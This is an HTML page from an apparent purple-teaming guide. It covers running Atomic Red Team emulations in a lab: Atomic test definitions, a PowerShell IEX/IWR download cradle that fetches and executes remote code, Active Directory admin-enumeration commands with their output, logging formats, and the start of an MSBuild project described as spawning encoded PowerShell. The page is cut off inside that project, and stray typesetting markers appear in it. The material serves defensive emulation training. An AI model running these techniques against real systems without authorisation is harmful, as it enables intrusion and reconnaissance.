@@ -1,0 +1,763 @@
+<!doctype html>
+<html lang="en-US"><head>
+   <meta charset="utf-8">
+    <!-- Chulapa Jekyll Theme -  -->
+    <!--  MIT License-->
+    <!-- Docs: https://dieghernan.github.io/chulapa -->
+    <!-- Repo: https://github.com/dieghernan/chulapa -->
+    <!-- Page build 2025-02-24 20:58:58 +0000 -->
+     <!-- Jekyll Version 3.10.0 -->
+    <!--Google Structured Data-->
+    <script type="application/ld+json">
+        {
+      "@context": "https://schema.org",
+	  "@type": "Article",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http://localhost:4000/part-II/lotl-with-atomic-red-team/"
+      },
+      "headline": "Living-off-the-Land with Atomic Red Team",
+      "image": "https://github.com/ajpc500.png",
+      "datePublished": "2025-02-24T20:58:58+00:00",
+      "dateModified": "2025-02-24T20:58:58+00:00",
+      "author": {
+        "@type": "Person",
+        "name": "ajpc500"
+      },
+       "publisher": {
+        "@type": "Organization",
+        "name": "ajpc500",
+        "url": "http://localhost:4000/",
+        "logo": {
+          "@type": "ImageObject",
+          "url": "https://github.com/ajpc500.png"
+        }
+      }
+    }
+    </script>
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "BreadcrumbList",
+      "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "name": "Home",
+        "item": "http://localhost:4000/"
+      },{
+        "@type": "ListItem",
+        "position": 2,
+        "name": "Living-off-the-Land with Atomic Red Team"
+      }]
+    }
+    </script>
+    <script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebPage",
+    "name": "Living-off-the-Land with Atomic Red Team",
+    "description": ""
+    }
+}
+</script><script type="application/ld+json">
+{
+  "@context" : "https://schema.org",
+  "@type" : "Person",
+  "homeLocation": {
+    "@type": "Place",
+    "name": "London, United Kingdom"
+    },
+  "description": "Publisher",
+  "name" : "ajpc500",
+  "url" : "http://localhost:4000/"
+}
+</script>
+   <title>Living-off-the-Land with Atomic Red Team | A Guide to Purple Teaming</title>
+  <link rel="canonical" href="http://localhost:4000/part-II/lotl-with-atomic-red-team/">
+    <!-- Atom feed -->
+  <link href="http://localhost:4000/atom.xml" type="application/atom+xml" rel="alternate" title="Atom feed A Guide to Purple Teaming" >
+    <!-- RSS 2.0 feed -->
+  <link href="http://localhost:4000/rss.xml" type="application/rss+xml" rel="alternate" title="RSS 2.0 feed A Guide to Purple Teaming" >
+    <!-- Meta tags -->
+   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+   <meta name="author" content="ajpc500" >
+   <meta name="copyright" content="ajpc500" >
+   <meta name="description" content="">
+   <meta name="thumbnail" content="https://github.com/ajpc500.png" >
+   <meta name="robots" content="index, follow"><meta name="keywords" content="">
+    <!-- Chrome, Firefox OS and Opera -->
+  <meta name="theme-color" content="#000000">
+    <!-- OpenGraph -->
+   <meta property="og:title" content="Living-off-the-Land with Atomic Red Team | A Guide to Purple Teaming" >
+   <meta property="og:site_name" content="A Guide to Purple Teaming | A Guide to Purple Teaming" >
+   <meta property="og:url" content="http://localhost:4000/part-II/lotl-with-atomic-red-team/" >
+   <meta property="og:type" content="website" >
+   <meta property="og:description" content="" >
+   <meta property="og:locale" content="en-US" >
+   <meta property="og:image" content="https://github.com/ajpc500.png" >
+    <!-- Twitter/X Cards -->
+   <meta name="twitter:card" content="summary_large_image"><!-- start custom head snippets -->
+<!-- this script is inserted before the css stylesheet -->
+<!-- end custom head snippets -->
+<!-- CSS -->
+    <!-- Preconnect with Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <!-- Fontawesome-->
+    <!-- v6 -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6/css/all.min.css">
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/js/chulapa_script.js" as="script" >
+  <link rel="preload" href="https://cdn.jsdelivr.net/gh/dieghernan/chulapa@master/assets/fonts/Chulapa/Chulapa-Bold_vmod.otf" as="font" type="font/otf" crossorigin>
+    <!-- Theme css (Bootstrap included) -->
+  <link rel="stylesheet" id="maincss" href="http://localhost:4000/assets/css/main.css" >
+    <!-- Highlighter -->
+  <link id="csshigh" rel="stylesheet" href="http://localhost:4000/assets/css/highlighter.css" >
+    <!-- Custom css -->
+  <link rel="stylesheet" href="http://localhost:4000/assets/css/custom.css" >
+      <!-- start custom head snippets -->
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<!-- end custom head snippets -->
+</head>
+<body class="d-flex flex-column h-entry" id="body">
+	<a class="u-url d-none" href="http://localhost:4000/part-II/lotl-with-atomic-red-team/">Invisible link to canonical for Microformats</a>
+	<div class="navbar-chulapa-fab">
+		<input type="checkbox" class="navbar-chulapa-fab-button d-none" id="navi-toggle">
+		<label for="navi-toggle" class="navbar-toggler p-1 m-0 text-center d-flex">
+			<span class="navbar-toggler-icon m-auto">&nbsp;</span>
+		</label>
+		<div class="navbar-chulapa-fab-background">&nbsp;</div>
+		<nav class="navbar-chulapa-fab-nav" aria-label="primary-navigation">
+			<ul class="navbar-nav text-center text-uppercase font-weight-light mt-0 mb-1 py-1">
+				<li class="nav-item">
+					<a class="nav-link px-3 navbar-brand mx-1 " href="http://localhost:4000/">Home</a>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-I:-How-Purple-Teaming-Works" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part I: How Purple Teaming Works</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-I:-How-Purple-Teaming-Works"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-basics-of-purple-teaming">1. The Basics of Purple Teaming </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/offensive-and-defensive-frameworks">2. Offensive and Defensive Frameworks </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-atomic-methodology">3. The Atomic Methodology </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-I/the-scenario-based-methodology">4. The Scenario-based Methodology </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-II:-Attack-Emulation-and-Detection-Lab" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part II: Attack Emulation and Detection Lab</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-II:-Attack-Emulation-and-Detection-Lab"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/environment-setup">5. Environment Setup </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/collecting-telemetry">6. Collecting Telemetry </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/network-traffic-and-event-tracing">7. Network Traffic and Event Tracing </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/lotl-with-atomic-red-team">8. Living-off-the-Land with Atomic Red Team </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/ad-recon-with-mitre-caldera">9. Active Directory Recon with MITRE Caldera </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-II/domain-compromise-with-mythic">10. Domain Compromise with Mythic </a></div>
+				</li><li class="nav-item dropdown my-0 py-1"><a class="nav-link dropdown-toggle px-3 py-1 " href="#" id="Part-III:-Organizing-an-Exercise" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Part III: Organizing an Exercise</a>
+					<div class="dropdown-menu dropdown-menu-right text-center rounded-0 pr-4" aria-labelledby="Part-III:-Organizing-an-Exercise"><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/reporting-and-tracking">11. Reporting and Tracking </a><a class="dropdown-item nav-link d-block px-3 small " href="http://localhost:4000/part-III/implementing-a-purple-teaming-function">12. Implementing a Purple Teaming Function </a></div>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/resources">Resources</a>
+				</li><li class="nav-item my-0 py-1">
+					<a class="nav-link px-3 py-1" href="http://localhost:4000/errata">Errata</a>
+				</li></ul>
+		</nav>
+	</div>	<header class="d-flex align-items-center hero-chulapa"><div class="container-lg py-4">
+   <h1 class="p-name">Living-off-the-Land with Atomic Red Team</h1>
+ </div>
+</header>
+	<main class="container-lg pb-3 flex-fill">
+		<div class="row pt-2">
+			<aside class="col-lg-2 mt-lg-3 small"></aside>
+			<article id="maincontent" class="col-lg-8 mt-3 e-content">
+			<div class="bs-component">
+   <div class="progress">
+       <div class="progress-bar progress-bar-striped progress-bar-animated" role="progressbar" aria-valuemin="0" aria-valuemax="100" style="width: 66.6%; background-color:#eb34e1"></div>
+   </div>
+</div>
+<h2 id="introduction">Introduction</h2>
+<p>This chapter is the first of three emulation scenarios, in which you’ll familiarize yourself with open-source tools that you may leverage in your own purple teams. In this first chapter, you’ll use Red Canary’s Atomic Red Team to cover the initial execution and discovery activities.</p>
+<hr />
+<h2 id="chapter-content">Chapter Content</h2>
+<p>This section provides reproductions of the key figures and code snippets seen in this chapter.</p>
+<h4 id="the-attack-scenario">The Attack Scenario</h4>
+<figure>
+<img src="/assets/images/8/scenario-0.png" style="width: 75%" title="Figure 8-1" />
+<figcaption>Figure 8-1: The initial stages of the emulation scenario</figcaption>
+</figure>
+<h4 id="the-atomic-red-team-test-library">The Atomic Red Team Test Library</h4>
+<h5 id="defining-atomics">Defining Atomics</h5>
+<p>An example Atomic that enumerates Active Directory domain trusts using <code class="language-plaintext highlighter-rouge">dsquery</code>.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">attack_technique</span><span class="pi">:</span> <span class="s">T1482</span> 
+<span class="na">display_name</span><span class="pi">:</span> <span class="s">Domain Trust Discovery</span>
+<span class="na">atomic_tests</span><span class="pi">:</span>
+<span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Windows - Discover domain trusts with dsquery</span>
+  <span class="na">auto_generated_guid</span><span class="pi">:</span> <span class="s">4700a710-c821-4e17-a3ec-9e4c81d6845f</span>
+  <span class="na">description</span><span class="pi">:</span> <span class="pi">|</span>
+    <span class="s">Uses the dsquery command to discover domain trusts.</span>
+    <span class="s">Requires the installation of dsquery via Windows RSAT or the</span>
+    <span class="s">Windows Server AD DS role.</span>
+  <span class="na">supported_platforms</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="s">windows</span>
+  <span class="na">executor</span><span class="pi">:</span>
+    <span class="na">command</span><span class="pi">:</span> <span class="pi">|</span>
+      <span class="s">dsquery * -filter "(objectClass=trustedDomain)" -attr *</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s">command_prompt</span> 
+<span class="s">--snip--</span>
+</code></pre></div></div>
+<p>Another <i>atomic</i> that highlights the potential for including manual steps to execute the documented test.</p>
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">attack_technique</span><span class="pi">:</span> <span class="s">T1176</span>
+<span class="na">display_name</span><span class="pi">:</span> <span class="s">Browser Extensions</span>
+<span class="na">atomic_tests</span><span class="pi">:</span>
+<span class="pi">-</span> <span class="na">name</span><span class="pi">:</span> <span class="s">Chrome/Chromium (Developer Mode)</span>
+  <span class="na">auto_generated_guid</span><span class="pi">:</span> <span class="s">3ecd790d-2617-4abf-9a8c-4e8d47da9ee1</span>
+  <span class="na">description</span><span class="pi">:</span> <span class="s">Turn on Chrome/Chromium developer mode and Load Extension found in the src directory</span>
+  <span class="na">supported_platforms</span><span class="pi">:</span>
+  <span class="pi">-</span> <span class="s">linux</span>
+  <span class="pi">-</span> <span class="s">windows</span>
+  <span class="pi">-</span> <span class="s">macos</span>
+  <span class="na">executor</span><span class="pi">:</span>
+    <span class="na">steps</span><span class="pi">:</span> <span class="pi">|</span>
+      <span class="s">1. Navigate to [chrome://extensions](chrome://extensions) and</span>
+      <span class="s">tick 'Developer Mode'.</span>
+
+      <span class="s">2. Click 'Load unpacked extension...' and navigate to</span>
+      <span class="s">[Browser_Extension](../t1176/src/)</span>
+
+      <span class="s">3. Click 'Select'</span>
+    <span class="na">name</span><span class="pi">:</span> <span class="s">manual</span>
+<span class="s">--snip--</span>
+</code></pre></div></div>
+<h5 id="executing-atomics-with-powershell">Executing Atomics with PowerShell</h5>
+<p>The download cradle to install Atomic Red Team via PowerShell and list the tests available.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">IEX</span><span class="w"> </span><span class="p">(</span><span class="n">IWR</span><span class="w"> </span><span class="s1">'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'</span><span class="w"> </span><span class="nt">-UseBasicParsing</span><span class="p">);</span><span class="w">
+</span><span class="n">Install-AtomicRedTeam</span><span class="w"> </span><span class="nt">-getAtomics</span><span class="w">
+</span></code></pre></div></div>
+<p>Listing tests available for a given MITRE ATT&amp;CK technique.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AtomicTest</span><span class="w"> </span><span class="nx">T1087.002</span><span class="w"> </span><span class="nt">-ShowDetailsBrief</span><span class="w">
+</span><span class="n">PathToAtomicsFolder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C:\AtomicRedTeam\atomics\</span><span class="w">
+
+</span><span class="n">T1087.002-1</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">accounts</span><span class="w"> </span><span class="p">(</span><span class="n">Domain</span><span class="p">)</span><span class="w">
+</span><span class="n">T1087.002-2</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">all</span><span class="w"> </span><span class="nx">accounts</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="p">(</span><span class="n">Domain</span><span class="p">)</span><span class="w">
+</span><span class="n">T1087.002-3</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">logged</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">users</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">CMD</span><span class="w"> </span><span class="p">(</span><span class="n">Domain</span><span class="p">)</span><span class="w">
+</span><span class="n">T1087.002-4</span><span class="w"> </span><span class="nx">Automated</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">Recon</span><span class="w"> </span><span class="p">(</span><span class="n">ADRecon</span><span class="p">)</span><span class="w">
+</span><span class="n">T1087.002-5</span><span class="w"> </span><span class="nx">Adfind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Listing</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">policy</span><span class="w">
+</span><span class="n">T1087.002-6</span><span class="w"> </span><span class="nx">Adfind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">Admins</span><span class="w">
+</span><span class="n">T1087.002-7</span><span class="w"> </span><span class="nx">Adfind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="nx">Objects</span><span class="w">
+</span><span class="n">T1087.002-8</span><span class="w"> </span><span class="nx">Adfind</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">Exchange</span><span class="w"> </span><span class="nx">AD</span><span class="w"> </span><span class="nx">Objects</span><span class="w">
+</span><span class="n">T1087.002-9</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Default</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Admin</span><span class="w"> </span><span class="nx">Details</span><span class="w"> </span><span class="p">(</span><span class="n">Domain</span><span class="p">)</span><span class="w">
+</span><span class="n">T1087.002-10</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">Unconstrained</span><span class="w"> </span><span class="nx">Delegation</span><span class="w">
+</span><span class="n">T1087.002-11</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">PowerView</span><span class="w">
+</span><span class="n">T1087.002-12</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Active</span><span class="w"> </span><span class="nx">Directory</span><span class="w"> </span><span class="nx">Users</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">ADSISearcher</span><span class="w">
+</span><span class="n">T1087.002-13</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Linked</span><span class="w"> </span><span class="nx">Policies</span><span class="w"> </span><span class="nx">In</span><span class="w"> </span><span class="nx">ADSISearcher</span><span class="w"> </span><span class="nx">Discovery</span><span class="w">
+</span><span class="n">T1087.002-14</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Root</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">linked</span><span class="w"> </span><span class="nx">policies</span><span class="w"> </span><span class="nx">Discovery</span><span class="w">
+</span><span class="n">T1087.002-15</span><span class="w"> </span><span class="nx">WinPwn</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">generaldomaininfo</span><span class="w">
+</span><span class="n">T1087.002-16</span><span class="w"> </span><span class="nx">Kerbrute</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">userenum</span><span class="w">
+</span><span class="n">T1087.002-17</span><span class="w"> </span><span class="nx">Wevtutil</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">Discover</span><span class="w"> </span><span class="nx">NTLM</span><span class="w"> </span><span class="nx">Users</span><span class="w"> </span><span class="nx">Remote</span><span class="w">
+</span><span class="nt">--snip</span><span class="o">--</span><span class="w">
+</span></code></pre></div></div>
+<p>Using the PowerShell cmdlets to list the details of an atomic.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AtomicTest</span><span class="w"> </span><span class="nx">T1087.002-9</span><span class="w"> </span><span class="nt">-ShowDetails</span><span class="w">
+</span><span class="n">PathToAtomicsFolder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">C:\AtomicRedTeam\atomics\</span><span class="w">
+
+</span><span class="p">[</span><span class="o">********</span><span class="n">BEGIN</span><span class="w"> </span><span class="n">TEST</span><span class="o">*******</span><span class="p">]</span><span class="w">
+</span><span class="n">Technique:</span><span class="w"> </span><span class="nx">Account</span><span class="w"> </span><span class="nx">Discovery:</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Account</span><span class="w"> </span><span class="nx">T1087.002</span><span class="w">
+</span><span class="n">Atomic</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="nx">Name:</span><span class="w"> </span><span class="nx">Enumerate</span><span class="w"> </span><span class="nx">Default</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Admin</span><span class="w"> </span><span class="nx">Details</span><span class="w"> </span><span class="p">(</span><span class="n">Domain</span><span class="p">)</span><span class="w">
+</span><span class="n">Atomic</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="nx">Number:</span><span class="w"> </span><span class="nx">9</span><span class="w">
+</span><span class="n">Atomic</span><span class="w"> </span><span class="nx">Test</span><span class="w"> </span><span class="nx">GUID:</span><span class="w"> </span><span class="nx">c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef</span><span class="w">
+</span><span class="n">Description:</span><span class="w"> </span><span class="nx">This</span><span class="w"> </span><span class="nx">test</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">enumerate</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">details</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">built-in</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">admin</span><span class="w"> </span><span class="nx">account</span><span class="w">
+</span><span class="n">Attack</span><span class="w"> </span><span class="nx">Commands:</span><span class="w">
+</span><span class="n">Executor:</span><span class="w"> </span><span class="nx">command_prompt</span><span class="w">
+</span><span class="n">ElevationRequired:</span><span class="w"> </span><span class="nx">False</span><span class="w">
+</span><span class="kr">Command</span><span class="p">:</span><span class="w">
+</span><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">administrator</span><span class="w"> </span><span class="nx">/domain</span><span class="w">
+</span><span class="p">[</span><span class="o">!!!!!!!!</span><span class="n">END</span><span class="w"> </span><span class="n">TEST</span><span class="o">!!!!!!!</span><span class="p">]</span><span class="w">
+</span></code></pre></div></div>
+<p>Finally, running an atomic for domain admin enumeration. Note, the output is included for review as well as the test metadata.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Tools&gt; Invoke-AtomicTest T1087.002-9
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics\
+
+Executing test: T1087.002-9 Enumerate Default Domain Admin Details (Domain)
+The request will be processed at a domain controller for domain attackrange.local.
+User name                    Administrator
+Full Name
+Comment                      Built-in account for administering the computer/domain
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+--snip--
+User may change password     Yes
+Workstations allowed         All
+Logon hours allowed          All
+Local Group Memberships      *Administrators
+Global Group memberships     *Schema Admins        *Enterprise Admins
+                             *Domain Admins
+                             *Domain Users         *Group Policy Creator
+The command completed successfully.
+Exit code: 0
+Done executing test: T1087.002-9 Enumerate Default Domain Admin Details (Domain)
+</code></pre></div></div>
+<h5 id="logging">Logging</h5>
+<p>Reviewing the default Atomic Red Team log stored at <code class="language-plaintext highlighter-rouge">$TEMP\Invoke-AtomicTest-ExecutionLog.csv</code>.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-Content</span><span class="w"> </span><span class="nv">$</span><span class="nn">ENV</span><span class="p">:</span><span class="nv">TEMP</span><span class="nx">\Invoke-AtomicTest-ExecutionLog.csv</span><span class="w">
+
+</span><span class="s2">"Execution Time (UTC)"</span><span class="p">,</span><span class="s2">"Execution Time (Local)"</span><span class="p">,</span><span class="s2">"Technique"</span><span class="p">,</span><span class="s2">"Test Number"</span><span class="p">,</span><span class="s2">"Test Name"</span><span class="p">,</span><span class="s2">"Hostname"</span><span class="p">,</span><span class="s2">"IP Address"</span><span class="p">,</span><span class="s2">"Username"</span><span class="p">,</span><span class="s2">"GUID"</span><span class="p">,</span><span class="s2">"ProcessId"</span><span class="p">,</span><span class="s2">"ExitCode"</span><span class="w">
+</span><span class="s2">"..."</span><span class="p">,</span><span class="s2">"..."</span><span class="p">,</span><span class="s2">"T1087.002"</span><span class="p">,</span><span class="s2">"9"</span><span class="p">,</span><span class="s2">"Enumerate Default Domain Admin Details (Domain)"</span><span class="p">,</span><span class="s2">"ar-win-2"</span><span class="p">,</span><span class="s2">"10.0.1.15"</span><span class="p">,</span><span class="s2">"ar-win-2\administrator"</span><span class="p">,</span><span class="s2">"c70ab9fd-19e2-4e02-a83c-9cfa8eaa8fef"</span><span class="p">,</span><span class="s2">"4384"</span><span class="p">,</span><span class="s2">"0"</span><span class="w">
+</span></code></pre></div></div>
+<p>Providing the <code class="language-plaintext highlighter-rouge">LoggingModule</code> and <code class="language-plaintext highlighter-rouge">ExecutionLogPath</code> arguments to <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest</code> to use the ATTiRe log format.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="nx">C:\Tools</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AtomicTest</span><span class="w"> </span><span class="nx">T1087.002-9</span><span class="w"> </span><span class="nt">-LoggingModule</span><span class="w"> </span><span class="s1">'Attire-ExecutionLogger'</span><span class="w"> </span><span class="nt">-ExecutionLogPath</span><span class="w"> </span><span class="nx">agpt-timestamp.json</span><span class="w">
+</span></code></pre></div></div>
+<p>An example log in ATTiRe format, produced by Atomic Red Team.</p>
+<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
+  </span><span class="nl">"attire-version"</span><span class="p">:</span><span class="w"> </span><span class="s2">"1.1"</span><span class="p">,</span><span class="w">
+  </span><span class="nl">"execution-data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+    </span><span class="nl">"execution-source"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Invoke-Atomicredteam"</span><span class="p">,</span><span class="w">
+    </span><span class="nl">"target"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"user"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ar-win-2</span><span class="se">\\</span><span class="s2">administrator"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"host"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ar-win-2"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"ip"</span><span class="p">:</span><span class="w"> </span><span class="s2">"10.0.1.15"</span><span class="p">,</span><span class="w">
+      </span><span class="err">--snip--</span><span class="w">
+    </span><span class="p">},</span><span class="w">
+    </span><span class="err">--snip--</span><span class="w">
+  </span><span class="p">},</span><span class="w">
+  </span><span class="nl">"procedures"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+    </span><span class="p">{</span><span class="w">
+      </span><span class="nl">"mitre-technique-id"</span><span class="p">:</span><span class="w"> </span><span class="s2">"T1087.002"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"procedure-name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Enumerate Default Domain Admin Details (Domain)"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"procedure-description"</span><span class="p">:</span><span class="w"> </span><span class="s2">"This test will enumerate the details of the built-in domain admin account</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+      </span><span class="nl">"steps"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+        </span><span class="p">{</span><span class="w">
+          </span><span class="nl">"order"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
+          </span><span class="nl">"executor"</span><span class="p">:</span><span class="w"> </span><span class="s2">"command_prompt"</span><span class="p">,</span><span class="w">
+          </span><span class="nl">"command"</span><span class="p">:</span><span class="w"> </span><span class="s2">"net user administrator /domain</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="w">
+          </span><span class="nl">"output"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
+            </span><span class="p">{</span><span class="w">
+          </span><span class="nl">"content"</span><span class="p">:</span><span class="w"> </span><span class="s2">"The request will be processed at a domain controller for domain attackrange.local ..."</span><span class="p">,</span><span class="w"> 
+              </span><span class="nl">"level"</span><span class="p">:</span><span class="w"> </span><span class="s2">"STDOUT"</span><span class="p">,</span><span class="w">
+              </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"console"</span><span class="w">
+            </span><span class="p">}</span><span class="w">
+          </span><span class="p">],</span><span class="w">
+		  </span><span class="err">--snip--</span><span class="w">
+        </span><span class="p">}</span><span class="w">
+      </span><span class="p">],</span><span class="w">
+      </span><span class="err">--snip--</span><span class="w">
+    </span><span class="p">}</span><span class="w">
+  </span><span class="p">]</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+<h4 id="creating-a-binary-execution-test-case">Creating a Binary Execution Test Case</h4>
+<p>A <i>csproj</i> file that spawns an encoded PowerShell command when executed via the <code class="language-plaintext highlighter-rouge">MSBuild.exe</code> binary.</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;Project</span> <span class="na">ToolsVersion=</span><span class="s">"4.0"</span> <span class="na">xmlns=</span><span class="s">"http://schemas.microsoft.com/developer/msbuild/2003"</span><span class="nt">&gt;</span>
+  <span class="nt">&lt;Target</span> <span class="na">Name=</span><span class="s">"BuildTarget"</span><span class="nt">&gt;</span>
+  (@\wingding{1}@) <span class="nt">&lt;AgptPowerShell</span> <span class="nt">/&gt;</span>
+  <span class="nt">&lt;/Target&gt;</span>
+  
+  <span class="nt">&lt;UsingTask</span>
+ <span class="err">(@\wingding{2}@)</span> <span class="na">TaskName=</span><span class="s">"AgptPowerShell"</span>
+    <span class="na">TaskFactory=</span><span class="s">"CodeTaskFactory"</span>
+    <span class="na">AssemblyFile=</span><span class="s">"C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll"</span> <span class="nt">&gt;</span>
